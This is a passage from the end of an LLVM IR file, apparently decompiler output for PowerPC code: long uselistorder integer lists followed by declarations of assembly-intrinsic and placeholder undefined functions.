1967, 1968, 1969, 1970, 1971, 1901, 1902, 1917, 343, 1918, 1919, 1920, 1604, 1605, 1606, 1607, 1608, 344, 1609, 1610, 1611, 1612, 1613, 1614, 1615, 1616, 1617, 1618, 1619, 1620, 1621, 141, 142, 1622, 1623, 1624, 1625, 1626, 1627, 1628, 1629, 1630, 43, 1631, 345, 94, 1632, 1633, 1634, 1635, 1636, 143, 1637, 1638, 1639, 1640, 1641, 1642, 1643, 1644, 2015, 2016, 144, 2017, 2018, 2019, 316, 317, 2020, 2021, 2022, 28, 7, 1645, 1646, 1647, 1648, 1649, 1650, 1651, 1652, 1653, 1654, 1655, 1656, 1657, 1658, 1659, 1660, 1661, 1662, 100, 2117, 2118, 2119, 2122, 2120, 8, 192, 1665, 1664, 193, 1663, 101, 1666, 1667, 1668, 145, 1669, 2046, 2060, 2061, 258, 2062, 1798, 2123, 2124, 2125, 2126, 2127, 2063, 346, 347, 348, 349, 2143, 2144, 350, 2149, 2169, 194, 2170, 351, 352, 2161, 9, 2128, 2129, 259, 146, 1764, 1765, 353, 260, 354, 1766, 1767, 73, 74, 1768, 1769, 1770, 355, 1771, 1772, 1773, 71, 72, 1774, 1775, 2130, 2131, 2132, 2133, 2134, 2135, 147, 356, 2142, 1507, 1508, 1509, 1510, 1511, 148, 1512, 1513, 1514, 318, 1515, 357, 1516, 261, 358, 359, 360, 1776, 361, 1781, 362, 1450, 1451, 1452, 149, 1453, 150, 1805, 1806, 195, 102, 121, 1807, 1808, 10, 1992, 1454, 1455, 151, 1456, 1457, 1458, 2066, 2068, 44, 2069, 75, 2070, 2067, 2064, 2065, 11, 1463, 1459, 1460, 1461, 1462, 196, 12, 2073, 2071, 2072, 197, 2074, 2075, 1464, 1465, 1466, 1467, 1468, 363, 1469, 1470, 2076, 2077, 364, 2078, 152, 2079, 2080, 2081, 2082, 2083, 2084, 2085, 2086, 13, 14, 1422, 1777, 1778, 1779, 76, 77, 1780, 15, 365, 319, 320, 366, 1972, 1973, 198, 1974, 1975, 1976, 1977, 1983, 1984, 1985, 1986, 153, 1987, 1988, 2039, 2023, 262, 367, 2150, 2151, 2152, 2153, 2154, 2155, 2156, 2157, 368, 2158, 16, 17, 2010, 154, 155, 1670, 1671, 29, 30, 263, 31, 1672, 199, 18, 2029, 2030, 2031, 78, 1673, 1674, 200, 369, 1675, 1978, 1979, 1980, 1981, 1982, 2099, 2100, 201, 1897, 19, 93, 2032, 202, 2171, 2172, 2173, 2174, 2175, 2176, 2177, 2178, 2162, 2163, 2164, 79, 2165, 2166, 2167, 2168, 156, 1676, 1677, 1678, 1679, 1680, 1681, 157, 1921, 1903, 1904, 1905, 1906, 1907, 1914, 1910, 1911, 1912, 1913, 203, 1915, 1916, 1908, 20, 80, 1909, 1471, 1922, 1472, 1473, 1682, 1683, 103, 1684, 1685, 1686, 1687, 1688, 245, 1689, 1690, 1691, 158, 1692, 1693, 1694, 1695, 1696, 159, 1697, 1698, 1699, 1700, 1701, 1702, 1703, 160, 1704, 1705, 1706, 1707, 1708, 1709, 1710, 1711, 1712, 1713, 1714, 45, 176, 177, 204, 1715, 1716, 161, 1717, 370, 1718, 1719, 371, 1722, 166, 162, 1720, 1721, 373, 1723, 1724, 1725, 1727, 167, 1728, 21, 22, 168, 169, 163, 164, 1729, 1730, 165, 1731, 1732, 1733, 1734, 1735, 1736, 1737, 1738, 1739, 372, 1740, 1741, 1742, 1743, 1744, 1745, 1746, 1747, 1748, 1749, 1423, 1750, 1751, 32, 1753, 81, 104, 170, 374, 1756, 321, 1757, 1752, 1754, 1755, 1758, 1759, 171, 1426, 1427, 95, 60, 87, 1726, 205, 1573, 1574, 1575, 1576, 2137, 2139, 2138, 207, 172, 2141, 2140, 206, 264, 1925, 1926, 1927, 173, 1928, 1929, 1930, 1931, 1932, 1933, 1934, 1935, 1936, 375, 1937, 1938, 1939, 1940, 1941, 1942, 246, 1760, 1761, 376, 1943, 1887, 1888, 1889, 1890, 1891, 1892, 2101, 2121, 377, 1809, 2112, 2113, 1474, 2024, 2044, 1475, 2050, 2145, 174, 2146, 2105, 2051, 2106, 1476, 2052, 1477, 1478, 1479, 1480, 1481, 1482, 1483, 1484, 1485, 1486, 2002, 2053, 2054, 1487, 2136, 2147, 2148, 2159, 2160, 249, 379, 380, 208, 1488, 383, 35, 36, 384, 1489, 1490, 392, 393, 488, 489, 33, 46, 247, 378, 1424, 381, 248, 382, 1491, 209, 105, 385, 1492, 1493, 1494, 1495, 1497, 231, 1496, 1498, 1499, 388, 389, 386, 387, 1500, 390, 391, 267, 266, 265, 268, 210, 1502, 394, 1501, 397, 398, 395, 396, 1503, 399, 1504, 400, 1505, 401, 1506, 402, 47, 88, 106, 107, 108, 109, 110, 1517, 250, 408, 269, 1518, 1519, 417, 1520, 1522, 407, 418, 1521, 215, 1523, 1524, 1525, 415, 1526, 1528, 406, 416, 1527, 214, 1529, 1530, 1531, 413, 1532, 1534, 405, 414, 1533, 213, 1535, 1536, 411, 1537, 1539, 404, 412, 1538, 212, 1540, 410, 1541, 1542, 1543, 419, 1544, 1546, 403, 420, 1545, 211, 1547, 409, 1548, 1549, 1550, 421, 1551, 1552, 422, 1553, 1554, 1555, 423, 1556, 1557, 1558, 424, 1559, 1560, 1561, 425, 1562, 1563, 1564, 1565, 1566, 1567, 1568, 1569, 1570, 1571, 1572, 426, 427, 1577, 429, 428, 216, 430, 175, 431, 1762, 218, 1763, 217, 178, 432, 271, 270, 219, 111, 434, 274, 275, 272, 435, 1791, 433, 1786, 1787, 1788, 1789, 1790, 220, 1792, 1793, 436, 322, 1794, 273, 1795, 1796, 1797, 112, 180, 439, 279, 278, 234, 232, 233, 440, 92, 323, 1799, 441, 438, 277, 1800, 179, 442, 276, 237, 235, 236, 443, 437, 1801, 1802, 1803, 1804, 280, 445, 446, 447, 444, 448, 449, 450, 451, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 1810, 48, 1811, 281, 452, 453, 454, 455, 456, 457, 458, 49, 181, 469, 470, 471, 472, 282, 283, 284, 1989, 324, 1990, 251, 1991, 82, 89, 90, 97, 96, 50, 51, 473, 34, 1993, 285, 286, 287, 288, 2001, 1995, 1997, 1998, 1999, 475, 2000, 476, 290, 289, 474, 83, 1994, 1996, 52, 113, 222, 221, 23, 24, 1425, 477, 2003, 291, 292, 293, 294, 2004, 2005, 295, 296, 478, 84, 2006, 114, 91, 2011, 223, 182, 2012, 297, 2007, 2008, 479, 480, 481, 2009, 325, 483, 2013, 299, 298, 482, 85, 484, 2014, 300, 2025, 238, 487, 2026, 303, 486, 86, 2027, 302, 485, 224, 301, 53, 183, 2028, 304, 490, 491, 492, 2034, 493, 2033, 495, 496, 494, 2040, 2041, 326, 2042, 2043, 115, 54, 327, 2045, 225, 2047, 497, 498, 499, 305, 2048, 2049, 306, 500, 2055, 2056, 501, 2057, 2058, 2059, 502, 116, 309, 307, 308, 503, 504, 2098, 117, 55, 239, 226, 312, 313, 2087, 2088, 2089, 2090, 227, 310, 311, 314, 2091, 2092, 2093, 229, 56, 118, 119, 228, 2095, 2096, 2097, 328, 120, 57, 2094, 2102, 2103, 315, 2179, 2180, 2181, 2104, 1428, 1429, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 1095, 1096, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 1104, 1105, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 1120, 1121, 1122, 1123, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 1135, 1136, 1137, 1138, 1139, 1140, 1141, 1142, 1143, 1144, 1145, 1146, 1147, 1148, 1149, 1150, 1151, 1152, 1153, 1154, 1155, 1156, 1157, 1158, 1159, 1160, 1161, 1162, 1163, 1164, 1165, 1166, 1167, 1168, 1169, 1170, 1171, 1172, 1173, 1174, 1175, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1188, 1189, 1190, 1191, 1192, 1193, 1194, 1195, 1196, 1197, 1198, 1199, 1200, 1201, 1202, 1203, 1204, 1205, 1206, 1207, 1208, 1209, 1210, 1211, 1212, 1213, 1214, 1215, 1216, 1217, 1218, 1219, 1220, 1221, 1222, 1223, 1224, 1225, 1226, 1227, 1228, 1229, 1230, 1231, 1232, 1233, 1234, 1235, 1236, 1237, 1238, 1239, 1240, 1241, 1242, 1243, 1244, 1245, 1246, 1247, 1248, 1249, 1250, 1251, 1252, 1253, 1254, 1255, 1256, 1257, 1258, 1259, 1260, 1261, 1262, 1263, 1264, 1265, 1266, 1267, 1268, 1269, 1270, 1271, 1272, 1273, 1274, 1275, 1276, 1277, 1278, 1279, 1280, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 1293, 1294, 1295, 1296, 1297, 1298, 1299, 1300, 1301, 1302, 1303, 1304, 1305, 1306, 1307, 1308, 1309, 1310, 1311, 1312, 1313, 1314, 1315, 1316, 1317, 1318, 1319, 1320, 1321, 1322, 1323, 1324, 1325, 1326, 1327, 1328, 1329, 1330, 1331, 1332, 1333, 1334, 1335, 1336, 1337, 1338, 1339, 1340, 1341, 1342, 1343, 1344, 1345, 1346, 1347, 1348, 1349, 1350, 1351, 1352, 1353, 1354, 1355, 1356, 1357, 1358, 1359, 1360, 1361, 1362, 1363, 1364, 1365, 1366, 1367, 1368, 1369, 1370, 1371, 1372, 1373, 1374, 1375, 1376, 1377, 1378, 1379, 1380, 1381, 1382, 1383, 1384, 1385, 1386, 1387, 1388, 1389, 1390, 1391, 1392, 1393, 1394, 1395, 1396, 1397, 1398, 1399, 1400, 1401, 1402, 1403, 1404, 1405, 1406, 1407, 1408, 1409, 1410, 1411, 1412, 1413, 1414, 1415, 1416, 1417, 1418, 2182, 2183, 2184, 2185, 2186, 2187, 2188, 2189, 2190, 2191, 2192, 2193, 2194, 2195, 2196, 2197, 2198, 2199, 2200, 2201, 2202, 2203, 2204, 2205 }
  uselistorder i32* @lr, { 11, 387, 388, 389, 390, 391, 392, 223, 645, 646, 647, 393, 397, 394, 395, 396, 401, 402, 398, 399, 400, 403, 404, 405, 406, 407, 12, 13, 14, 17, 15, 16, 408, 411, 409, 1, 410, 0, 412, 415, 416, 413, 414, 417, 418, 419, 420, 421, 422, 423, 424, 331, 224, 225, 425, 426, 427, 428, 226, 227, 228, 229, 622, 652, 653, 654, 655, 648, 649, 650, 651, 429, 434, 449, 435, 436, 437, 450, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 585, 332, 333, 334, 335, 230, 231, 232, 656, 233, 234, 438, 439, 444, 445, 446, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 657, 658, 247, 248, 623, 624, 667, 668, 672, 673, 674, 675, 676, 689, 691, 693, 669, 671, 348, 304, 305, 306, 307, 308, 309, 310, 659, 665, 666, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 327, 18, 19, 379, 21, 380, 20, 22, 625, 627, 626, 23, 24, 25, 26, 27, 28, 628, 629, 630, 631, 632, 633, 326, 596, 490, 491, 349, 634, 560, 536, 83, 537, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 505, 506, 507, 508, 586, 558, 677, 678, 679, 680, 681, 684, 685, 686, 549, 249, 250, 251, 571, 572, 573, 574, 252, 503, 504, 575, 692, 690, 253, 254, 255, 447, 440, 442, 443, 441, 29, 448, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 9, 10, 270, 211, 212, 660, 661, 662, 663, 664, 687, 688, 451, 452, 453, 454, 455, 456, 457, 458, 284, 285, 286, 430, 431, 432, 433, 588, 30, 605, 31, 32, 33, 34, 670, 606, 682, 683, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 61, 60, 62, 63, 64, 65, 66, 67, 68, 69, 71, 70, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 213, 214, 215, 220, 216, 217, 218, 219, 2, 221, 222, 289, 287, 288, 3, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 328, 329, 330, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 4, 5, 6, 7, 8, 381, 382, 383, 384, 385, 386, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 550, 551, 552, 533, 534, 535, 538, 539, 540, 541, 542, 543, 544, 553, 545, 546, 547, 548, 554, 555, 556, 557, 559, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 576, 577, 578, 579, 580, 581, 582, 583, 584, 587, 589, 590, 591, 592, 593, 594, 595, 597, 598, 599, 600, 601, 602, 603, 604, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 635, 636, 637, 638, 639, 640, 642, 641, 643, 644 }
}

declare i32 @__asm_rlwinm(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwinm.(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwimi(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_mfcr() local_unnamed_addr

declare %0 @__asm_mtcrf(i32, i32) local_unnamed_addr

declare %2 @__asm_mcrf_cr0_write(i4) local_unnamed_addr

declare %1 @__asm_cror(i32, i32, i32) local_unnamed_addr

declare i32 @unknown_0(i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i64 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16 @__decompiler_undefined_function_4() local_unnamed_addr

declare i16* @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr
